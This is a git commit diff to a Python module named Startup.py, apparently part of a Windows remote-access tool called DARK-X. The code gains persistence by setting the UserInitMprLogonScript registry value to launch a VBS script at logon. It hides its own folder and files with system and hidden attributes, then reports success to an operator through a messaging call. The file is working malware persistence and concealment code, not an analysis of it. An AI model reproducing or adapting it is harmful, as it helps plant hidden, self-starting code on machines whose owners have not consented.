842232760c1850dcd70cf6a33e8f71d32ab45327
UQABXO <92090431+UQABXO@users.noreply.github.com>
2022-05-20 04:49:53 +0200

    Update Startup.py

--- Startup.py
+++ Startup.py
@@ -6,9 +6,9 @@ class Startup():
 		self.Main()
 
 	def Main(self):
-		os.system("cmd.exe /c attrib +s +h \"C:\Users\Public\DARK-X\" & attrib +s +h -r \"C:\Users\Public\DARK-X\*.*\" /s /d")
 		dirname = os.path.dirname(os.path.abspath(sys.argv[0]))
 		root_key=OpenKey(HKEY_CURRENT_USER, r'Environment', 0, KEY_WRITE)
 		SetValueEx(root_key,"UserInitMprLogonScript",0,REG_SZ,"wscript.exe " + dirname + "\\Main.vbs")
 		CloseKey(root_key)
+		os.system("cmd.exe /c attrib +s +h \"" + dirname + "\" & attrib +s +h -r \"" + dirname + "\*.*\" /s /d")
 		self._.Send_Message("%E2%9C%94%EF%B8%8F Startup Setted.")
